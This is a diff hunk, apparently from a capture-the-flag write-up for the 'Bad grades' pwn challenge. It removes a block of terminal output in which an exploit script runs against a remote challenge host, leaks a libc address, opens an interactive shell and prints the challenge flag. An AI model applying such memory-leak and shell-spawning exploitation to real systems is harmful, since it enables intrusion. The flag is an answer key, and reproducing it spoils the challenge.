@@ -401,14 +401,3 @@ send_floats(
         exploit()
     ```
 
-    ```bash
-    alter ^ Sol in ~/HTB/chal/pwn/Bad grades
-    $ ./xpl.py REMOTE 94.237.54.116 40708
-    [+] Opening connection to 94.237.54.116 on port 40708: Done
-    [*] Leak: 0x7febcdd4aaa0
-    [*] Libc base: 0x7febcdcca000
-    [*] Switching to interactive mode
-    Your new average is: 9320600893962.79
-    $ cat flag.txt
-    HTB{c4n4ry_1s_4fr41d_0f_s1gn3d_numb3r5}
-    ```
